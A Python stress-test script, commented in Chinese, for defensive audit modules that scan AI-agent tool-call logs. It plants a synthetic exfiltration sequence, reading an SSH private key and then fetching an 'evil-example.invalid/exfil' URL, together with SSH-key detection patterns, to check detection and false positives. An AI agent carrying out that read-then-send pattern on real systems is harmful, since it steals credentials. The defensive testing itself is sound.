#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MVP 压力测试（隔离沙箱）

目的：验证六个只读审计模块在规模、检出、误报、鲁棒性、缺 key 韧性五个维度的表现。
安全约束：
  - 全部在 tempfile 临时目录运行；复制模块副本，改写 config.json 指向假 sessions_dir；
  - 合成数据为虚构路径与虚构 host，不含任何真实凭据 / token / 用户数据；
  - 不修改、不读取任何真实密钥文件；不碰真实工作区配置。

输出 reports/stress_test_report.md。
"""
import json, os, pathlib, shutil, subprocess, sys, tempfile, time, datetime

SRC = pathlib.Path(__file__).resolve().parents[1]
MODULES_SRC = SRC / "modules"
REPORT = SRC / "reports" / "stress_test_report.md"

SCALES = [("S", 200), ("M", 2000), ("L", 10000)]
WHITELIST = ["registry.npmjs.org", "github.com", "pypi.org"]
EVIL = "evil-example.invalid"     # 保留域名，确保不会真实解析


def call(ts, name, args, sid):
    return {"type": "function_call", "name": name, "arguments": args,
            "sessionId": sid, "timestamp": str(ts), "cwd": "/tmp/sandbox"}


def gen_records(n):
    """生成 n 条调用 + 固定正例 + 固定误报对照，时间戳递增。"""
    recs, t = [], 1_700_000_000_000
    # 规模填充：无害的 Glob + 白名单 WebFetch
    for i in range(n):
        recs.append(call(t + i * 10, "Glob", {"pattern": f"/tmp/sandbox/src/{i}/*.py"}, f"bulk-{i % 20}"))
    # 正例：读敏感路径 → 60s 内外联白名单外 host
    recs.append(call(t + 100, "Read", {"file_path": "/tmp/sandbox/.ssh/id_rsa"}, "POSITIVE-CASE"))
    recs.append(call(t + 160_000, "WebFetch", {"url": f"https://{EVIL}/exfil"}, "POSITIVE-CASE"))
    # 误报对照：读普通包配置 → 访问白名单 host
    recs.append(call(t + 200, "Read", {"file_path": "/tmp/sandbox/package.json"}, "BENIGN-CASE"))
    recs.append(call(t + 230_000, "WebFetch", {"url": "https://registry.npmjs.org/pkg"}, "BENIGN-CASE"))
    recs.sort(key=lambda r: int(r["timestamp"]))
    return recs


def build_case(base, n, corrupt=False):
    """搭建一个隔离用例根目录。"""
    wb = base / ".workbuddy"
    sess = base / "sessions"
    (base / "modules").mkdir(parents=True, exist_ok=True)
    wb.mkdir(parents=True, exist_ok=True)
    sess.mkdir(parents=True, exist_ok=True)
    for f in MODULES_SRC.glob("*.py"):
        shutil.copy(f, base / "modules" / f.name)

    cfg = {
        "workbuddy_dir": str(wb),
        "sessions_dir": str(sess),
        "scan_roots": [str(base / "repos")],
        "allowed_egress_hosts": WHITELIST + ["localhost", "127.0.0.1", "::1"],
        "trusted_remote_host_hints": ["github.com"],
        "credential_paths": [str(base / "fake_creds" / "keyblob"),
                             str(base / "fake_creds" / "id_rsa")],
        "sensitive_path_patterns": [r"\.ssh[/\\]", "keyblob",
                                    r"id_(rsa|dsa|ecdsa|ed25519)"],
        "combo_window_seconds": 300,
    }
    (base / "config.json").write_text(json.dumps(cfg, ensure_ascii=False), encoding="utf-8")
    (wb / "settings.json").write_text(json.dumps(
        {"sandbox": {"networkDenyAllMigrated": True, "extraAllowWrite": []}}), encoding="utf-8")

    # 紧凑分隔符，与真实 projects/*.jsonl 一致（模块以 '"type":"function_call"' 过滤）
    lines = [json.dumps(r, ensure_ascii=False, separators=(",", ":")) for r in gen_records(n)]
    if corrupt:
        lines += ['{"type":"function_call", BROKEN', "x" * 5000, "\xff\xfe not utf8"]
    (sess / "run.jsonl").write_text("\n".join(lines), encoding="utf-8", errors="replace")
    return base


def run_module(base, module, env):
    t0 = time.perf_counter()
    p = subprocess.run([sys.executable, str(base / "modules" / module)],
                       capture_output=True, text=True, timeout=120, env=env,
                       encoding="utf-8", errors="replace")
    dt = time.perf_counter() - t0
    out = base / "data" / (module.replace(".py", ".json"))
    data = {}
    if out.exists():
        try:
            data = json.loads(out.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"exit": p.returncode, "seconds": round(dt, 3), "data": data,
            "stderr": p.stderr.strip()[-200:]}


def evaluate():
    rows, checks = [], {}
    for label, n in SCALES:
        with tempfile.TemporaryDirectory(prefix="asb_stress_") as td:
            base = build_case(pathlib.Path(td), n)
            env = os.environ.copy()
            env["USERPROFILE"] = str(base)
            env["HOME"] = str(base)
            combo = run_module(base, "combo_alert.py", env)
            egress = run_module(base, "egress_audit.py", env)
            cred = run_module(base, "credential_hygiene.py", env)

            alerts = combo["data"].get("alerts", [])
            hit_positive = any(a.get("session") == "POSITIVE-CASE" for a in alerts)
            hit_benign = any(a.get("session") == "BENIGN-CASE" for a in alerts)
            ex_hosts = egress["data"].get("external_hosts_not_in_baseline", {})
            rows.append({
                "scale": label, "calls": n + 4,
                "combo_exit": combo["exit"], "combo_seconds": combo["seconds"],
                "egress_exit": egress["exit"], "egress_seconds": egress["seconds"],
                "cred_exit": cred["exit"],
                "alerts": len(alerts), "positive_detected": hit_positive,
                "benign_false_positive": hit_benign,
                "external_hosts": ex_hosts,
            })
            if label == "M":
                checks["positive_detected"] = hit_positive
                checks["benign_not_flagged"] = not hit_benign
                checks["evil_in_egress"] = EVIL in ex_hosts
                checks["cred_no_key_ok"] = (
                    cred["exit"] == 0 and cred["data"].get("high_risk_reachable_count") == 0)

    # 鲁棒性：畸形行 + 缺 key（凭据路径不存在）
    with tempfile.TemporaryDirectory(prefix="asb_stress_corrupt_") as td:
        base = build_case(pathlib.Path(td), 300, corrupt=True)
        env = os.environ.copy()
        env["USERPROFILE"] = str(base)
        env["HOME"] = str(base)
        combo = run_module(base, "combo_alert.py", env)
        cred = run_module(base, "credential_hygiene.py", env)
        checks["corrupt_input_no_crash"] = combo["exit"] == 0 and cred["exit"] == 0
        checks["corrupt_still_detects"] = any(
            a.get("session") == "POSITIVE-CASE" for a in combo["data"].get("alerts", []))

    overall = "PASS" if all(checks.values()) and all(
        r["combo_exit"] == 0 and r["egress_exit"] == 0 and r["cred_exit"] == 0 for r in rows) else "REVIEW"
    return rows, checks, overall


def main():
    rows, checks, overall = evaluate()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "# Agent 安全基线 — MVP 压力测试报告",
        "",
        f"生成时间：{now} · 判定：**{overall}**",
        "",
        "## 结论先行",
        "",
        "在完全隔离的临时目录中，对 6 个只读模块的 3 个核心模块（combo_alert / egress_audit / credential_hygiene）"
        "做了规模、检出、误报、鲁棒性、缺 key 韧性五维压测。"
        + ("全部检查通过：正例被检出、误报对照未触发、畸形输入不崩溃、缺 key 时安全降级。" if overall == "PASS"
           else "存在未通过项，见下方检查表，需复核。"),
        "",
        "## 一、规模与耗时（合成数据，非真实会话）",
        "",
        "| 档位 | 调用数 | combo_exit | combo 耗时 | egress_exit | egress 耗时 | cred_exit | 告警数 |",
        "|---|---|---|---|---|---|---|---|",
    ]
    for r in rows:
        lines.append(f"| {r['scale']} | {r['calls']} | {r['combo_exit']} | {r['combo_seconds']}s | "
                     f"{r['egress_exit']} | {r['egress_seconds']}s | {r['cred_exit']} | {r['alerts']} |")
    lines += [
        "",
        "## 二、正确性与鲁棒性检查",
        "",
        "| 检查项 | 结果 | 说明 |",
        "|---|---|---|",
    ]
    desc = {
        "positive_detected": "注入的『读 .ssh → 外联 evil host』被 combo_alert 检出",
        "benign_not_flagged": "『读 package.json → 访问官方源』未被误报",
        "evil_in_egress": "egress_audit 把白名单外的 evil host 列入外部 host",
        "cred_no_key_ok": "凭据路径不存在时安全降级、不崩溃、不高估风险",
        "corrupt_input_no_crash": "畸形 JSON / 超长行 / 非 UTF-8 输入下模块不崩溃",
        "corrupt_still_detects": "混杂畸形行后仍能检出正例",
    }
    for k, v in checks.items():
        lines.append(f"| {desc.get(k, k)} | {'PASS' if v else 'FAIL'} | {k} |")
    lines += [
        "",
        "## 三、隔离与安全边界",
        "",
        "- 模块副本、合成会话、假凭据路径全部位于 `tempfile` 临时目录，运行后自动删除。",
        "- 合成 host 为保留域 `evil-example.invalid`，不会真实解析或外发。",
        "- 全程未读取、未复制、未写入任何真实密钥 / token / 凭证文件；未改真实配置、防火墙、权限。",
        "",
        "## 四、复跑",
        "",
        "```bash",
        "python D:/AI_Factory/agent-security-baseline/tests/mvp_stress_test.py",
        "```",
        "",
        "> 压测证明的是『当前实现在合成负载下行为正确』，不等价于真实环境零误报；"
        "误报对照仅覆盖最典型的包管理器场景。",
    ]
    REPORT.parent.mkdir(parents=True, exist_ok=True)
    REPORT.write_text("\n".join(lines), encoding="utf-8")
    print("report:", REPORT)
    print("overall:", overall)
    print("checks:", checks)
    for r in rows:
        print(f"  {r['scale']}: combo={r['combo_seconds']}s egress={r['egress_seconds']}s "
              f"alerts={r['alerts']} pos={r['positive_detected']} benign={r['benign_false_positive']}")


if __name__ == "__main__":
    main()
